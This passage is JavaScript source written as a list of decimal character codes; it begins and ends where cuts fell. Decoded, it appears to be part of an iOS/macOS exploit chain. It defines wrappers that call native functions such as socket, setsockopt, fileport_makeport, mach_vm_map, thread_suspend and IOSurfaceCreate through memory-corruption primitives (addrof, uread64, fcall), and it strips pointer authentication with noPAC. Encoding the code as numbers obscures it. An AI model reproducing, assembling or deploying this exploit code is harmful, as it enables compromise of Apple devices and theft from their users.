111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 34, 41, 59, 10, 108, 101, 116, 32, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 86, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 118, 34, 41, 59, 10, 108, 101, 116, 32, 80, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 65, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 97, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 111, 99, 107, 101, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 65, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 97, 116, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 76, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 108, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 77, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 82, 67, 72, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 114, 99, 104, 114, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 34, 41, 59, 10, 108, 101, 116, 32, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 82, 69, 77, 79, 86, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 114, 101, 109, 111, 118, 101, 34, 41, 59, 10, 108, 101, 116, 32, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 34, 41, 59, 10, 108, 101, 116, 32, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 34, 41, 59, 10, 108, 101, 116, 32, 84, 72, 82, 69, 65, 68, 95, 83, 85, 83, 80, 69, 78, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 116, 104, 114, 101, 97, 100, 95, 115, 117, 115, 112, 101, 110, 100, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 77, 65, 75, 69, 95, 77, 69, 77, 79, 82, 89, 95, 69, 78, 84, 82, 89, 95, 54, 52, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 109, 97, 107, 101, 95, 109, 101, 109, 111, 114, 121, 95, 101, 110, 116, 114, 121, 95, 54, 52, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 86, 77, 95, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 118, 109, 95, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 77, 65, 80, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 109, 97, 112, 34, 41, 59, 10, 108, 101, 116, 32, 77, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 85, 78, 76, 79, 67, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 117, 110, 108, 111, 99, 107, 34, 41, 59, 10, 108, 101, 116, 32, 85, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 110, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 67, 82, 69, 65, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 80, 82, 69, 70, 69, 84, 67, 72, 80, 65, 71, 69, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 80, 114, 101, 102, 101, 116, 99, 104, 80, 97, 103, 101, 115, 34, 41, 59, 10, 108, 101, 116, 32, 73, 79, 83, 85, 82, 70, 65, 67, 69, 71, 69, 84, 66, 65, 83, 69, 65, 68, 68, 82, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 73, 79, 83, 117, 114, 102, 97, 99, 101, 71, 101, 116, 66, 97, 115, 101, 65, 100, 100, 114, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 73, 79, 83, 117, 114, 102, 97, 99, 101, 65, 108, 108, 111, 99, 83, 105, 122, 101, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 68, 85, 77, 80, 40, 97, 100, 100, 114, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 47, 47, 32, 102, 99, 97, 108, 108, 40, 108, 111, 99, 97, 108, 95, 100, 117, 109, 112, 44, 32, 97, 100, 100, 114, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 109, 97, 108, 108, 111, 99, 40, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 98, 117, 102, 102, 32, 61, 32, 110, 101, 119, 32, 85, 105, 110, 116, 56, 65, 114, 114, 97, 121, 40, 66, 105, 103, 73, 110, 116, 40, 115, 122, 41, 46, 97, 115, 73, 110, 116, 51, 50, 115, 41, 46, 102, 105, 108, 108, 40, 48, 120, 48, 48, 41, 59, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 117, 114, 101, 97, 100, 54, 52, 40, 109, 101, 109, 46, 97, 100, 100, 114, 111, 102, 40, 98, 117, 102, 102, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 103, 101, 116, 115, 112, 101, 99, 105, 102, 105, 99, 40, 107, 101, 121, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 71, 69, 84, 83, 80, 69, 67, 73, 70, 73, 67, 44, 32, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 116, 104, 114, 44, 32, 118, 97, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 84, 72, 82, 69, 65, 68, 95, 74, 79, 73, 78, 44, 32, 116, 104, 114, 44, 32, 118, 97, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 40, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 44, 32, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 112, 97, 116, 104, 44, 32, 108, 101, 110, 103, 116, 104, 95, 112, 116, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 111, 110, 102, 115, 116, 114, 40, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 79, 78, 70, 83, 84, 82, 44, 32, 110, 97, 109, 101, 44, 32, 98, 117, 102, 44, 32, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 114, 99, 104, 114, 40, 115, 44, 32, 99, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 82, 67, 72, 82, 44, 32, 115, 44, 32, 99, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 99, 97, 116, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 67, 65, 84, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 108, 101, 110, 40, 115, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 76, 69, 78, 44, 32, 115, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 115, 116, 114, 40, 115, 49, 44, 32, 115, 50, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 83, 84, 82, 44, 32, 115, 49, 44, 32, 115, 50, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 116, 114, 110, 99, 109, 112, 40, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 84, 82, 78, 67, 77, 80, 44, 32, 115, 49, 44, 32, 115, 50, 44, 32, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 111, 99, 107, 101, 116, 40, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 79, 67, 75, 69, 84, 44, 32, 100, 111, 109, 97, 105, 110, 44, 32, 116, 121, 112, 101, 44, 32, 112, 114, 111, 116, 111, 99, 111, 108, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 115, 111, 99, 107, 111, 112, 116, 40, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 84, 83, 79, 67, 75, 79, 80, 84, 44, 32, 115, 111, 99, 107, 101, 116, 44, 32, 108, 101, 118, 101, 108, 44, 32, 111, 112, 116, 105, 111, 110, 95, 110, 97, 109, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 118, 97, 108, 117, 101, 44, 32, 111, 112, 116, 105, 111, 110, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 40, 102, 100, 44, 32, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 44, 32, 102, 100, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 40, 112, 111, 114, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 44, 32, 112, 111, 114, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 115, 101, 116, 95, 112, 97, 116, 116, 101, 114, 110, 56, 40, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 44, 32, 98, 117, 102, 44, 32, 118, 97, 108, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 109, 109, 101, 109, 40, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 69, 77, 77, 69, 77, 44, 32, 98, 105, 103, 44, 32, 98, 105, 103, 95, 108, 101, 110, 44, 32, 108, 105, 116, 116, 108, 101, 44, 32, 108, 105, 116, 116, 108, 101, 95, 108, 101, 110, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 99, 99, 101, 115, 115, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 67, 67, 69, 83, 83, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 111, 112, 101, 110, 40, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 79, 80, 69, 78, 44, 32, 112, 97, 116, 104, 44, 32, 109, 111, 100, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 108, 111, 115, 101, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 76, 79, 83, 69, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 119, 114, 105, 116, 101, 40, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 87, 82, 73, 84, 69, 44, 32, 98, 117, 102, 44, 32, 115, 122, 44, 32, 110, 105, 116, 101, 109, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 118, 40, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 86, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 105, 111, 118, 44, 32, 105, 111, 118, 99, 110, 116, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 119, 114, 105, 116, 101, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 87, 82, 73, 84, 69, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 112, 114, 101, 97, 100, 40, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 80, 82, 69, 65, 68, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 98, 117, 102, 102, 44, 32, 115, 105, 122, 101, 44, 32, 111, 102, 102, 115, 101, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 97, 100, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 65, 68, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 119, 114, 105, 116, 101, 40, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 87, 82, 73, 84, 69, 44, 32, 102, 100, 44, 32, 98, 117, 102, 44, 32, 115, 122, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 114, 101, 109, 111, 118, 101, 40, 112, 97, 116, 104, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 82, 69, 77, 79, 86, 69, 44, 32, 112, 97, 116, 104, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 114, 99, 52, 114, 97, 110, 100, 111, 109, 40, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 65, 82, 67, 52, 82, 65, 78, 68, 79, 77, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 116, 97, 115, 107, 95, 116, 104, 114, 101, 97, 100, 115, 40, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 84, 65, 83, 75, 95, 84, 72, 82, 69, 65, 68, 83, 44, 32, 116, 97, 115, 107, 44, 32, 116, 104, 114, 101, 97, 100, 95, 108, 105, 115, 116, 95, 97, 100, 100, 114, 44, 32, 116, 104, 114, 101, 97, 100, 95, 99, 111, 117, 110, 116, 95, 97, 100, 100, 114, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 99, 110, 116, 108, 40, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 67, 78, 84, 76, 44, 32, 102, 100, 44, 32, 102, 108, 97, 103, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 48, 110, 44, 32, 118, 97, 108, 117, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 108, 115, 101, 101, 107, 40, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 76, 83, 69, 69, 75, 44, 32, 102, 105, 108, 100, 101, 115, 44, 32, 111, 102, 102, 115, 101, 116, 44, 32, 119, 104, 101, 110, 99, 101, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 102, 115, 121, 110, 99, 40, 102, 100, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 70, 83, 89, 78, 67, 44, 32, 102, 100, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 101, 110, 99, 111, 100, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 97, 108, 108, 111, 99, 97, 116, 111, 114, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 100, 105, 99, 116, 44, 32, 107, 101, 121, 44, 32, 118, 97, 108, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 